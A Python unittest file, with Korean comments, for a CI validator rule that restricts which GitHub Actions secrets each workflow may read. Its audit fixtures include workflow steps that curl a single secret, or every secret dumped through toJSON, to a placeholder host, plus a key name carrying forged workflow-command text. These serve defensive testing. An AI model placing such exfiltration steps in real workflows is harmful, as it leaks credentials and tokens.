"""WF-17 시크릿 허용표(독립 감사 BA-S2 R3-③, 운영자 확인 040 ① 승인 — 이슈 #271).

워크플로 파일마다 쓸 수 있는 시크릿 이름의 표(`WORKFLOW_SECRET_USE`·동적 색인 표 `WORKFLOW_SECRET_INDEX`)를 검증기가 지키는지 본다 — 표에 없는 `secrets.이름`·`toJSON(secrets)` 같은 통째 읽기·`secrets[식]` 동적 색인·
`secrets: inherit` 는 오류다. 표는 지금 진짜 워크플로가 실제로 쓰는 것과 양쪽으로 같고(진짜 파일의 읽기는 검증기의 정규식을 빌리지 않는 이 시험의 독립 읽기), 새로 거절하는 곳은 0 이다.
감사 변이 L2·L3·L4·L9·L11(시크릿을 curl 로 내보내거나 toJSON 을 env 에 담는 새 워크플로)과 기존 워크플로에 시크릿을 더하는 변이(감사 C5·C11 꼴)를 시험한다. 네트워크·GitHub 없음, 가짜 이름만 쓴다.
PyYAML 이 있어야 돈다(없는 환경에서는 건너뜀 — requirements-dev.txt 가 CI 에 설치한다).
"""
import re
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

import _bootstrap
from real_repo_helpers import run_checks_once

sys.path.insert(0, str(_bootstrap.ROOT / "scripts"))
import validate_repo as vr  # noqa: E402

try:
    import yaml
except ImportError:  # pragma: no cover - requirements-dev.txt 가 CI 에 설치한다
    yaml = None

REAL = _bootstrap.ROOT
NEEDS_YAML = unittest.skipUnless(yaml is not None, "PyYAML(requirements-dev.txt)이 필요합니다(CI 에서는 항상 실행됩니다)")
WORKFLOWS = REAL / ".github" / "workflows"
CHANCE = "chance" + "blog.yml"                     # 실제 워크플로 파일 이름(이어 붙여 적는다 — 금지어 점검에 걸리지 않게, 옛 시험과 같은 방식)
BLOCK = re.compile(r"\$\{\{(.*?)\}\}", re.S)


def real_text(name):
    return (WORKFLOWS / name).read_bytes().decode("utf-8").replace("\r\n", "\n")


def swapped(text, old, new, count=1):
    if text.count(old) != count:
        raise AssertionError(f"옛 글 {old!r} 가 {text.count(old)} 번 나온다(기대 {count})")
    return text.replace(old, new)


def workflow(name, on_block, steps_block, perms="  contents: read\n"):
    """감사 변이 하네스(`_wf`)와 같은 모양 — job 하나짜리 새 워크플로."""
    return ('name: "[공통] ' + name + '"\non:\n' + on_block + "permissions:\n" + perms + "jobs:\n  j:\n    name: 일\n    runs-on: ubuntu-latest\n    timeout-minutes: 5\n    steps:\n" + steps_block)


def all_strings(node):
    if isinstance(node, str):
        yield node
    elif isinstance(node, dict):
        for value in node.values():
            yield from all_strings(value)
    elif isinstance(node, list):
        for value in node:
            yield from all_strings(value)


def real_usage():
    """진짜 워크플로가 `${{ }}` 식 안에서 쓰는 시크릿 — 검증기의 정규식을 빌리지 않는 독립 읽기: ({파일: {대문자 이름}}, {파일: {색인 식 전체}}, 통째 읽기 목록)."""
    names, indexes, whole = {}, {}, []
    for path in sorted(WORKFLOWS.glob("*.y*ml")):
        data = yaml.safe_load(path.read_bytes().decode("utf-8"))
        for value in all_strings(data):
            for body in BLOCK.findall(value):
                flat = " ".join(body.split())
                for found in re.findall(r"(?<![\w.\-])secrets\.([A-Za-z0-9_]+)", flat):
                    names.setdefault(path.name, set()).add(found.upper())
                if re.search(r"(?<![\w.\-])secrets\[", flat):
                    indexes.setdefault(path.name, set()).add(flat)
                if re.search(r"(?<![\w.\-])secrets(?![\w.\[\-])", flat):
                    whole.append((path.name, flat))
    return names, indexes, whole


class Case(unittest.TestCase):
    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self._tmp.cleanup)
        self.root = Path(self._tmp.name)

    def put(self, text, name="zz-new.yml"):
        path = self.root / ".github" / "workflows" / name
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text, encoding="utf-8", newline="")
        return f".github/workflows/{name}"

    def found(self, text, name="zz-new.yml"):
        return vr.check_workflow_secret_use(self.root, [self.put(text, name)])

    def levels(self, text, name="zz-new.yml"):
        return [(f.check, f.level) for f in self.found(text, name)]


def one_plain_line(test, finding):
    for text in (finding.message, finding.line()):
        test.assertEqual(len(text.splitlines()), 1, text)
        test.assertNotIn("::", text)
        test.assertNotIn("##[", text)


@NEEDS_YAML
class TableMatchesRealityTest(unittest.TestCase):
    def test_the_use_table_is_exactly_what_the_real_workflows_use_in_both_directions(self):
        """표가 지금 파일과 정확히 같다 — 새 사용은 검증기가, 줄거나 파일이 바뀐 것은 이 시험이 알려 표를 함께 고치게 한다(표가 실제보다 넓으면 그 틈이 열려 있는 것이다)."""
        names, _indexes, _whole = real_usage()
        self.assertEqual(names, {name: set(values) for name, values in vr.WORKFLOW_SECRET_USE.items()})
        for name, values in vr.WORKFLOW_SECRET_USE.items():
            self.assertEqual(values, tuple(sorted(set(values))), name)                       # 대문자·정렬·중복 없음
            self.assertEqual(values, tuple(value.upper() for value in values), name)
            self.assertTrue((WORKFLOWS / name).is_file(), name)

    def test_the_index_table_is_exactly_the_dynamic_indexes_the_real_workflows_use(self):
        _names, indexes, _whole = real_usage()
        self.assertEqual(indexes, {name: set(values) for name, values in vr.WORKFLOW_SECRET_INDEX.items()})
        self.assertEqual(set(indexes), {"naver.yml", "tistory.yml"})

    def test_no_real_workflow_reads_all_secrets_at_once(self):
        self.assertEqual(real_usage()[2], [])

    def test_the_real_repository_passes_the_check_and_the_whole_validator_has_no_error(self):
        files = [f for f in vr.list_files(REAL) if f.startswith(".github/workflows/")]
        self.assertGreaterEqual(len(files), 20)
        self.assertEqual([f.line() for f in vr.check_workflow_secret_use(REAL, files)], [])
        findings = run_checks_once(REAL)
        self.assertEqual([f.line() for f in findings if f.level == "ERROR"], [])
        self.assertEqual([f.line() for f in findings if f.check == "WF-17"], [])

    def test_a_workflow_without_any_secret_needs_no_row_and_the_three_such_files_have_none(self):
        names, _indexes, _whole = real_usage()
        for name in ("auto-pr.yml", "pages.yml", "sync-issue-form.yml"):
            self.assertNotIn(name, names)
            self.assertNotIn(name, vr.WORKFLOW_SECRET_USE)

    def test_the_description_text_that_spells_secrets_dot_name_outside_an_expression_is_not_a_use(self):
        """blogger.yml 의 description 칸에는 `secrets.llm_api_key` 같은 글이 있다 — 식(`${{ }}`) 밖이라 쓰임이 아니므로 표에 올리지 않고 검사도 지적하지 않는다."""
        text = real_text("blogger.yml")
        self.assertIn("secrets.llm_api_key", text)
        self.assertNotIn("LLM_API_KEY", vr.WORKFLOW_SECRET_USE["blogger.yml"])                 # 표에는 식으로 쓰는 PIPELINE_SECRET_LLM_API_KEY 만 있다
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / ".github" / "workflows" / "blogger.yml"
            path.parent.mkdir(parents=True)
            path.write_text(text, encoding="utf-8", newline="")
            self.assertEqual(vr.check_workflow_secret_use(Path(tmp), [".github/workflows/blogger.yml"]), [])


@NEEDS_YAML
class NewWorkflowTest(Case):
    """감사 변이: 시크릿을 밖으로 내보내거나 통째로 담는 새 워크플로는 표에 없으므로 오류다."""

    L2 = workflow("이슈 시크릿", "  issues:\n    types: [opened]\n", '      - name: 보내기\n        env:\n          GEMINI_API_KEY: ${{ secrets.GEMINI_API_KEY }}\n        run: curl -s -d "$GEMINI_API_KEY" https://example.invalid/x\n')
    L3 = workflow("PR 시크릿", "  pull_request:\n", "      - name: 보내기\n        env:\n          TOKEN_X: ${{ secrets.BLOGGER_REFRESH_TOKEN }}\n        run: echo done\n")
    L4 = workflow("푸시 시크릿", "  push:\n", "      - name: 보내기\n        env:\n          K: ${{ secrets.GEMINI_API_KEY }}\n        run: python -c \"import os,base64;print(base64.b64encode(os.environ['K'].encode()))\"\n")
    L9 = workflow("이슈 시크릿", "  issues:\n    types: [opened]\n", '      - name: 보내기\n        env:\n          GEMINI_API_KEY: ${{ secrets.GEMINI_API_KEY }}\n        run: curl -s -d "$GEMINI_API_KEY" https://example.invalid/x\n')
    L11 = workflow("덤프", "  push:\n", '      - name: 덤프\n        env:\n          ALL: ${{ toJSON(secrets) }}\n        run: curl -s -d "$ALL" https://example.invalid/x\n')

    def test_the_audit_mutations_that_use_one_named_secret_are_each_one_error_naming_it(self):
        for label, text, name in (("L2", self.L2, "GEMINI_API_KEY"), ("L3", self.L3, "BLOGGER_REFRESH_TOKEN"), ("L4", self.L4, "GEMINI_API_KEY"), ("L9", self.L9, "GEMINI_API_KEY")):
            with self.subTest(label=label):
                found = self.found(text)
                self.assertEqual([(f.check, f.level) for f in found], [("WF-17", "ERROR")], [f.line() for f in found])
                self.assertIn(f"`{name}`", found[0].message)
                self.assertIn("WORKFLOW_SECRET_USE", found[0].message)
                self.assertIn("jobs.j.steps.0.env", found[0].message)
                self.assertEqual(found[0].path, ".github/workflows/zz-new.yml")
                one_plain_line(self, found[0])

    def test_the_audit_mutation_L11_that_puts_every_secret_in_one_env_is_an_error(self):
        found = self.found(self.L11)
        self.assertEqual([(f.check, f.level) for f in found], [("WF-17", "ERROR")])
        self.assertIn("전체", found[0].message)
        self.assertIn("jobs.j.steps.0.env.ALL", found[0].message)

    def test_a_new_workflow_that_uses_no_secret_is_fine(self):
        self.assertEqual(self.found(workflow("조용", "  workflow_dispatch:\n", "      - run: echo hi\n")), [])

    def test_the_run_checks_entry_reports_it_and_the_check_is_quiet_without_pyyaml_and_for_a_broken_file(self):
        self.put(self.L2)
        self.assertIn(("WF-17", "ERROR"), [(f.check, f.level) for f in vr.run_checks(self.root)])
        with mock.patch.object(vr, "yaml", None):
            self.assertEqual(vr.check_workflow_secret_use(self.root, [".github/workflows/zz-new.yml"]), [])
        for text in ("name: [unclosed\n", "- a\n- b\n", ""):
            self.assertEqual(self.found(text), [])                                               # WF-0 이 알린다 — 여기서는 죽지 않고 비어 있다

    def test_the_hostile_place_of_a_secret_cannot_forge_a_workflow_command(self):
        evil = "evil\\n::error::forged ##[group]x"
        text = workflow("적대", "  workflow_dispatch:\n", f'      - name: x\n        env:\n          "{evil}": ' + "${{ secrets.GEMINI_API_KEY }}\n        run: echo hi\n")
        found = self.found(text)
        self.assertEqual(len(found), 1)
        one_plain_line(self, found[0])


@NEEDS_YAML
class ExistingWorkflowTest(Case):
    """진짜 워크플로에 시크릿 하나를 더하거나 통째 읽기를 넣는 변이."""

    def mutated(self, name, old, new, count=1):
        return self.found(swapped(real_text(name), old, new, count), name)

    def test_one_more_secret_than_the_row_allows_is_an_error_for_that_name_only(self):
        shadow_anchor = "          SHADOW_RUN: '1'\n"
        for label, name, old, new, secret in (
                ("audit C5: GITHUB_TOKEN into the shadow run", "chance-shadow.yml", shadow_anchor, shadow_anchor + "          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n", "GITHUB_TOKEN"),
                ("audit C11: a telegram secret into the shadow run", "chance-shadow.yml", shadow_anchor, shadow_anchor + "          TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}\n", "TELEGRAM_BOT_TOKEN"),
                ("a Gemini key into the scope check", "pr-scope-check.yml", "      - uses: actions/setup-python@v6\n", "      - uses: actions/setup-python@v6\n        env:\n          K: ${{ secrets.GEMINI_API_KEY }}\n", "GEMINI_API_KEY"),
                ("a Blogger token into the watchdog", "watchdog.yml", "      - uses: actions/setup-python@v6\n", "      - uses: actions/setup-python@v6\n        env:\n          T: ${{ secrets.BLOGGER_REFRESH_TOKEN }}\n", "BLOGGER_REFRESH_TOKEN"),
                ("the Korean blog token into the English wrapper", "blogger-en.yml", "      PIPELINE_SECRET_BLOG_ID: ${{ secrets.BLOGGER_BLOG_ID }}\n", "      PIPELINE_SECRET_BLOG_ID: ${{ secrets.BLOGGER_KO_BLOG_ID }}\n", "BLOGGER_KO_BLOG_ID")):
            with self.subTest(label=label):
                found = self.mutated(name, old, new)
                hits = [f for f in found if f"`{secret}`" in f.message]
                self.assertEqual(len(hits), 1, [f.line() for f in found])
                self.assertEqual({f.check for f in found}, {"WF-17"})

    def test_toJSON_of_all_secrets_added_to_an_existing_step_is_an_error_audit_L10(self):
        old = "      - uses: actions/setup-python@v6\n"
        found = self.mutated("operator-reply.yml", old, old + "        env:\n          ALL: ${{ toJSON(secrets) }}\n")
        self.assertEqual([(f.check, f.level) for f in found], [("WF-17", "ERROR")])

    def test_the_unchanged_real_files_are_clean_so_every_red_above_comes_from_its_own_mutation(self):
        for name in ("chance-shadow.yml", "pr-scope-check.yml", "watchdog.yml", "blogger-en.yml", "operator-reply.yml", CHANCE, "naver.yml"):
            with self.subTest(name=name):
                self.assertEqual(self.found(real_text(name), name), [])


@NEEDS_YAML
class SpellingTest(Case):
    BASE = ('name: "[공통] 시험"\non:\n  workflow_dispatch:\npermissions:\n  contents: read\njobs:\n  j:\n    name: 일\n    runs-on: ubuntu-latest\n    timeout-minutes: 5\n    steps:\n      - name: x\n        env:\n          K: {value}\n        run: echo hi\n')

    def levels_of(self, value, name="zz-new.yml"):
        return [(f.check, f.level) for f in self.found(self.BASE.format(value=value), name)]

    def test_names_are_compared_without_regard_to_case_and_a_literal_bracket_index_is_the_same_as_a_dot(self):
        for value in ("${{ secrets.gemini_api_key }}", "${{ secrets.Gemini_Api_Key }}", "${{ secrets['GEMINI_API_KEY'] }}", "${{ secrets [ 'gemini_api_key' ] }}", "${{ SECRETS.GEMINI_API_KEY }}",
                      "${{ secrets . GEMINI_API_KEY }}", "${{ secrets.GEMINI_API_KEY || '' }}", "${{ format('{0}', secrets.GEMINI_API_KEY) }}", "prefix-${{ secrets.GEMINI_API_KEY }}-suffix"):
            with self.subTest(value=value):
                self.assertEqual(self.levels_of(value, CHANCE), [])                       # GEMINI_API_KEY 가 행에 있는 파일 둘은 어떤 철자든 통과
                self.assertEqual(self.levels_of(value, "chance-shadow.yml"), [])
                self.assertEqual(self.levels_of(value, "pr-scope-check.yml"), [("WF-17", "ERROR")])     # 행에 없는 파일은 같은 철자로도 오류

    def test_an_unauthorised_name_is_named_in_upper_case_whatever_its_spelling(self):
        for value in ("${{ secrets.other_key }}", "${{ secrets['Other_Key'] }}"):
            with self.subTest(value=value):
                found = self.found(self.BASE.format(value=value))
                self.assertEqual(len(found), 1)
                self.assertIn("`OTHER_KEY`", found[0].message)

    def test_a_name_with_a_hyphen_tail_is_a_different_name_and_never_the_allowed_one(self):
        """시험 렌즈 Q 의 Q21: 식에서 속성 이름은 하이픈을 품는다(`secrets.GEMINI_API_KEY-x` 의 이름은 `GEMINI_API_KEY-x`) — 이름 글자 집합에서 하이픈을 빼면 하이픈 앞에서 끊어 읽어
        행에 있는 허용 이름(`GEMINI_API_KEY`)으로 둔갑한다. GEMINI_API_KEY 가 행에 있는 파일에서도 오류이고 오류 문구는 하이픈 꼬리까지 이름으로 적는다."""
        for value, shown in (("${{ secrets.GEMINI_API_KEY-x }}", "GEMINI_API_KEY-X"), ("${{ secrets.gemini_api_key-evil }}", "GEMINI_API_KEY-EVIL"), ("${{ secrets.GEMINI_API_KEY-  }}", None),
                             ("${{ secrets.GEMINI_API_KEY--x }}", "GEMINI_API_KEY--X"), ("${{ format('{0}', secrets.GEMINI_API_KEY-x) }}", "GEMINI_API_KEY-X")):
            for name in (CHANCE, "chance-shadow.yml"):
                with self.subTest(value=value, name=name):
                    found = self.found(self.BASE.format(value=value), name)
                    if shown is None:                                                           # 하이픈 뒤가 비어도(`KEY-`) 이름은 `GEMINI_API_KEY-` 라 허용 이름이 아니다
                        self.assertEqual([(f.check, f.level) for f in found], [("WF-17", "ERROR")], [f.line() for f in found])
                        self.assertIn("`GEMINI_API_KEY-`", found[0].message)
                        continue
                    self.assertEqual([(f.check, f.level) for f in found], [("WF-17", "ERROR")], [f.line() for f in found])
                    self.assertIn(f"`{shown}`", found[0].message)
        self.assertEqual(self.levels_of("${{ secrets.GEMINI_API_KEY }}", CHANCE), [])                 # 하이픈 꼬리가 없으면 그대로 허용(위 시험들과 같다)

    def test_a_dynamic_index_is_an_error_unless_that_exact_expression_is_listed_for_that_file(self):
        exact = "${{ secrets[matrix.secret_llm_api_key] }}"
        self.assertEqual(self.levels_of(exact, "naver.yml"), [])
        self.assertEqual(self.levels_of(exact, "tistory.yml"), [])
        self.assertEqual(self.levels_of("${{ secrets[ matrix.Secret_LLM_API_KEY ] }}", "naver.yml"), [])         # 공백·대소문자는 접는다
        for label, value, name in (("new file", exact, "zz-new.yml"), ("other listed file", exact, "blogger.yml"), ("other expression", "${{ secrets[matrix.other] }}", "naver.yml"),
                                   ("extra text", "${{ secrets[matrix.secret_llm_api_key] || 'x' }}", "naver.yml"), ("computed", "${{ secrets[format('A_{0}', matrix.x)] }}", "tistory.yml"),
                                   ("inner secrets", "${{ secrets[secrets.GITHUB_TOKEN] }}", "naver.yml"), ("star", "${{ secrets.* }}", "naver.yml"), ("env index", "${{ secrets[env.NAME] }}", "naver.yml")):
            with self.subTest(label=label):
                found = self.found(self.BASE.format(value=value), name)
                self.assertTrue(found and all(f.check == "WF-17" and f.level == "ERROR" for f in found), [f.line() for f in found])

    def test_every_way_of_reading_all_secrets_at_once_is_an_error_in_any_place(self):
        values = ("${{ toJSON(secrets) }}", "${{ toJson(SECRETS) }}", "${{ format('{0}', secrets) }}", "${{ join(secrets, ',') }}", "${{ secrets.* }}", "${{ fromJSON(toJSON(secrets)) }}",
                  "${{ contains(toJSON(secrets), 'x') }}", "${{ secrets }}", "${{ toJSON( secrets ) }}")
        for value in values:
            for name in ("zz-new.yml", CHANCE, "naver.yml"):
                with self.subTest(value=value, name=name):
                    found = self.found(self.BASE.format(value=value), name)
                    self.assertIn(("WF-17", "ERROR"), [(f.check, f.level) for f in found], value)
                    self.assertTrue(any("전체" in f.message or "동적 색인" in f.message for f in found), [f.message for f in found])

    def test_the_other_places_a_secret_can_be_read_are_read_too(self):
        run = workflow("자리", "  workflow_dispatch:\n", '      - run: echo "${{ secrets.OTHER_A }}"\n')
        with_ = workflow("자리", "  workflow_dispatch:\n", "      - uses: actions/checkout@v6\n        with:\n          token: ${{ secrets.OTHER_B }}\n")
        job_env = workflow("자리", "  workflow_dispatch:\n", "      - run: echo hi\n").replace("    timeout-minutes: 5\n", "    timeout-minutes: 5\n    env:\n      X: ${{ secrets.OTHER_C }}\n")
        top_env = workflow("자리", "  workflow_dispatch:\n", "      - run: echo hi\n").replace("jobs:\n", "env:\n  X: ${{ secrets.OTHER_D }}\njobs:\n", 1)
        call = ('name: "[공통] 자리"\non:\n  workflow_dispatch:\npermissions:\n  contents: read\njobs:\n  j:\n    uses: ./.github/workflows/blogger.yml\n    secrets:\n      PIPELINE_SECRET_LLM_API_KEY: ${{ secrets.OTHER_E }}\n')
        for label, text, name in (("run", run, "OTHER_A"), ("with", with_, "OTHER_B"), ("job env", job_env, "OTHER_C"), ("workflow env", top_env, "OTHER_D"), ("job secrets mapping", call, "OTHER_E")):
            with self.subTest(label=label):
                found = self.found(text)
                self.assertEqual([(f.check, f.level) for f in found], [("WF-17", "ERROR")], [f.line() for f in found])
                self.assertIn(f"`{name}`", found[0].message)

    def test_a_condition_is_an_expression_even_without_braces(self):
        job_if = workflow("조건", "  workflow_dispatch:\n", "      - run: echo hi\n").replace("    timeout-minutes: 5\n", "    timeout-minutes: 5\n    if: secrets.OTHER_F != ''\n")
        step_if = workflow("조건", "  workflow_dispatch:\n", "      - if: ${{ secrets.OTHER_G != '' }}\n        run: echo hi\n      - if: secrets.OTHER_H != ''\n        run: echo hi\n")
        found = self.found(job_if)
        self.assertEqual([(f.check, f.level) for f in found], [("WF-17", "ERROR")])
        self.assertIn("`OTHER_F`", found[0].message)
        names = sorted(re.findall(r"`(OTHER_[A-Z])`", " ".join(f.message for f in self.found(step_if))))
        self.assertEqual(names, ["OTHER_G", "OTHER_H"])
        self.assertEqual(self.found(workflow("조건", "  workflow_dispatch:\n", "      - if: github.event_name == 'push'\n        run: echo hi\n")), [])

    def test_text_that_only_mentions_secrets_is_not_a_use(self):
        for value in ("${{ steps.secrets.outputs.x }}", "${{ matrix.secrets }}", "${{ needs.secrets.result }}", "${{ format('secrets.OTHER') }}", "${{ env.SECRETS_FILE }}", "${{ github.event.inputs.secrets }}",
                      "'not an expression: secrets.OTHER'", "${{ vars.OTHER }}", "${{ github.token }}", "${{ contains(github.event.issue.labels.*.name, 'secrets') }}"):
            with self.subTest(value=value):
                self.assertEqual(self.levels_of(value), [])

    def test_each_unauthorised_use_is_reported_once_per_file_with_its_first_place(self):
        text = workflow("반복", "  workflow_dispatch:\n", '      - run: echo "${{ secrets.OTHER }}" "${{ secrets.OTHER }}"\n      - env:\n          X: ${{ secrets.OTHER }}\n          Y: ${{ secrets.ANOTHER }}\n        run: echo hi\n')
        found = self.found(text)
        self.assertEqual(sorted(re.findall(r"`([A-Z]+)`", " ".join(f.message for f in found))), ["ANOTHER", "OTHER"])
        self.assertIn("jobs.j.steps.0.run", [f for f in found if "`OTHER`" in f.message][0].message)

    def test_secrets_inherit_is_an_error_in_any_file_in_any_spelling(self):
        for text in ("inherit", " Inherit ", "INHERIT"):
            with self.subTest(text=text):
                call = ('name: "[공통] 자리"\non:\n  workflow_dispatch:\npermissions:\n  contents: read\njobs:\n  j:\n    uses: ./.github/workflows/blogger.yml\n    secrets: "' + text + '"\n')
                found = self.found(call, "blogger-en.yml")
                self.assertEqual([(f.check, f.level) for f in found], [("WF-17", "ERROR")])
                self.assertIn("inherit", found[0].message)
        self.assertEqual(self.found(('name: "[공통] 자리"\non:\n  workflow_dispatch:\npermissions:\n  contents: read\njobs:\n  j:\n    uses: ./.github/workflows/blogger.yml\n    secrets: inherit\n'))[0].check, "WF-17")

    def test_a_declared_secret_of_a_reusable_workflow_that_is_never_used_is_not_flagged(self):
        text = ('name: "[공통] 자리"\non:\n  workflow_call:\n    secrets:\n      NEVER_USED:\n        required: false\npermissions:\n  contents: read\njobs:\n  j:\n    name: 일\n    runs-on: ubuntu-latest\n'
                "    timeout-minutes: 5\n    steps:\n      - run: echo hi\n")
        self.assertEqual(self.found(text), [])


@NEEDS_YAML
class TableDrivesTheVerdictTest(Case):
    def test_adding_a_name_to_the_table_is_what_allows_it_and_nothing_else_does(self):
        text = workflow("표", "  workflow_dispatch:\n", "      - env:\n          K: ${{ secrets.BRAND_NEW_SECRET }}\n        run: echo hi\n")
        self.assertEqual(self.levels(text), [("WF-17", "ERROR")])
        with mock.patch.dict(vr.WORKFLOW_SECRET_USE, {"zz-new.yml": ("BRAND_NEW_SECRET",)}):
            self.assertEqual(self.levels(text), [])
            other = text.replace("BRAND_NEW_SECRET", "SOMETHING_ELSE")
            self.assertEqual(self.levels(other), [("WF-17", "ERROR")])
        with mock.patch.dict(vr.WORKFLOW_SECRET_USE, {"zz-new.yml": ("brand_new_secret",)}):           # 표의 이름이 소문자여도 대문자로 접어 견준다
            self.assertEqual(self.levels(text), [])

    def test_the_file_name_decides_not_the_folder_or_the_case_of_the_extension(self):
        text = workflow("표", "  workflow_dispatch:\n", "      - env:\n          K: ${{ secrets.GITHUB_TOKEN }}\n        run: echo hi\n")
        self.assertEqual(self.levels(text, "watchdog.yml"), [])
        self.assertEqual(self.levels(text, "Watchdog.yml"), [("WF-17", "ERROR")])
        self.assertEqual(self.levels(text, "watchdog.YML"), [("WF-17", "ERROR")])


class DocsTest(unittest.TestCase):
    """안전 규칙 문서의 WF-17·G-S2·WF-13 행, 엔지니어링 가이드의 확장 행, 결함 D-492 행을 한 줄씩 읽는다 — 시험 렌즈 Q 의 Q55·Q56: 이 줄들을 지워도 모든 시험이 통과했다. 안전 독립 검증 S 의 N1·N5 문장도 못박는다."""

    @staticmethod
    def text(rel):
        return (REAL / rel).read_bytes().decode("utf-8").replace("\r\n", "\n")

    def row(self, rel, prefix, cells):
        rows = [line for line in self.text(rel).split("\n") if line.startswith(prefix)]
        self.assertEqual(len(rows), 1, prefix)
        self.assertEqual(rows[0].replace("\\|", "").count("|"), cells + 1, f"{prefix} — 글 안에 파이프 글자를 그대로 쓰면 표의 칸이 깨진다")
        for forbidden in ("{{", "{%", "~", "http://", "https://"):
            self.assertNotIn(forbidden, rows[0], (prefix, forbidden))
        return rows[0]

    def test_the_wf17_row_says_what_the_rule_reads_what_it_does_not_and_who_merges_a_table_change(self):
        row = self.row("docs/SECURITY_GUARDRAILS.md", "| WF-17 |", 3)
        for needle in ("`WORKFLOW_SECRET_USE`", "`WORKFLOW_SECRET_INDEX`", "`toJSON(secrets)`", "`secrets: inherit`", "`secrets[matrix.secret_llm_api_key]`", "대소문자를 가리지 않고", "`description`",
                       "운영자가 검토해 직접 병합한다", "한계", "`github.token`", "독립 검증 S 의 N1", "WF-1 의 쓰기 권한 허용 표", "G-S2"):
            self.assertIn(needle, row, needle)

    def test_the_g_s2_row_points_at_the_table_and_wf17(self):
        row = self.row("docs/SECURITY_GUARDRAILS.md", "| G-S2 |", 3)
        for needle in ("WF-17", "`WORKFLOW_SECRET_USE`", "결함 D-492", "운영자 검토", "REG-3"):
            self.assertIn(needle, row, needle)

    def test_the_wf13_row_and_the_telegram_checker_docstring_point_at_wf17_for_the_nameless_reads(self):
        row = self.row("docs/SECURITY_GUARDRAILS.md", "| WF-13 |", 3)
        for needle in ("`toJSON(secrets)`", "**WF-17** 이 잡는다", "독립 검증 S 의 N5"):
            self.assertIn(needle, row, needle)
        for needle in ("WF-17", "check_workflow_secret_use", "독립 검증 S 의 N5"):
            self.assertIn(needle, vr.check_telegram_secrets.__doc__, needle)

    def test_the_secret_checker_docstring_and_the_table_comment_say_that_github_token_is_outside(self):
        for needle in ("github.token", "WORKFLOW_WRITE_PERMISSIONS", "독립 검증 S 의 N1"):
            self.assertIn(needle, vr.check_workflow_secret_use.__doc__, needle)
        source = (REAL / "scripts" / "validate_repo.py").read_bytes().decode("utf-8")
        comment = source[source.index("# 지금까지 시크릿 규칙은"):source.index("WORKFLOW_SECRET_USE = {")]
        for needle in ("github.token", "WF-1 의 쓰기 권한 허용 표", "운영자가 직접 병합한다"):
            self.assertIn(needle, comment, needle)

    def test_the_engineering_guide_extension_row_tells_who_fixes_the_table_and_where_the_other_rules_live(self):
        row = self.row("docs/ENGINEERING_GUIDE.md", "| 워크플로가 새 시크릿을 쓰게 하기", 2)
        for needle in ("`WORKFLOW_SECRET_USE`", "`WORKFLOW_SECRET_INDEX`", "**WF-17**", "운영자가 검토해 직접 병합한다", "**WF-13**", "**WF-14**", "**WF-15**", "**WF-16**", "SECURITY_GUARDRAILS.md"):
            self.assertIn(needle, row, needle)

    def test_the_defect_row_d492_is_there_once_with_the_table_the_tests_the_limits_and_the_corrected_audit_numbers(self):
        row = self.row("docs/DEFECT_REGISTER.md", "| **D-492** |", 6)
        for needle in ("**해결**", "**WF-17**", "`WORKFLOW_SECRET_USE`", "`WORKFLOW_SECRET_INDEX`", "`secrets[matrix.secret_llm_api_key]`", "tests/test_validate_secret_table.py", "L2·L3·L4·L9·L11",
                       "운영자가 직접 병합한다", "독립 감사 BA-S2 R3-③", "운영자 확인 040 ① 승인", "`github.token`", "독립 검증 S 의 N1", "(N5)", "**남은 것**"):
            self.assertIn(needle, row, needle)
        self.assertNotIn("L10", row)                                   # L10 은 옛 검증기도 WF-14 로 잡았다 — 감사가 '침묵한다' 고 적은 것은 L2·L3·L4·L9·L11 뿐이다


if __name__ == "__main__":
    unittest.main()
